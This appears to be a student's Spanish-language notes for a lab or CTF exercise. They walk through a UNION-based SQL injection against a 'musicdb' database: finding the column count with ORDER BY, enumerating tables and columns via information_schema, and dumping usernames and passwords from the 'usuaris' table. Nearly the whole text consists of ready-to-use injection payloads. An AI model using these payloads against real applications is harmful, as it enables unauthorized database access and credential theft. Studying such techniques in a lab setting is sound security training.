-- Mira el pdf para entender por qué están mal, si es que lo están, porque vaya movie xd

-- Lo suyo sería empezar adivinando el tamaño con un 

'ORDER BY 100 -- -

'

-- Ignora la comilla de antes porque no se como seguir escribiendo normal si no. 
-- Haciendo la técnica del sandwich hayaría la cantidad de columnas, y una vez que lo tengo (son 5). Esto es necesario porque un UNION SELECT necesita tener el mismo nuimero de columnas que la query original:

'UNION SELECT 1, DATABASE(), 3, 4, 5-- -

'

-- Eso en teoría debería arrojar el nombre de la base de datos En el campo de Nombre (musicdb).
-- Para sacar el nombre de la tabla 

'UNION SELECT 1, table_name, 3, 4, 5 FROM information_schema.tables WHERE table_schema = 'musicdb'-- -

'

-- Después de probar con las tablas encontrariamos que la siguiente tabla nos devuelve campos que parecen interesantes:

'UNION SELECT 1, column_name, 3, 4, 5 FROM information_schema.columns WHERE table_name = 'usuaris'-- -

'

-- Esta consulta nos arrojaría los campos nom_usuari y contrasenya
-- Para hacer la ultima consulta:

'UNION SELECT 1, nom_usuari, contrasenya, 4, 5 FROM usuaris-- -

'

-- Si no se estuviese usando la base de datos musicdb para la consulta original tendríamos que definir la tabla como musicdb.usuaris


-- IMPORTANTE MIRAR EL PDF EN ESTA PARTE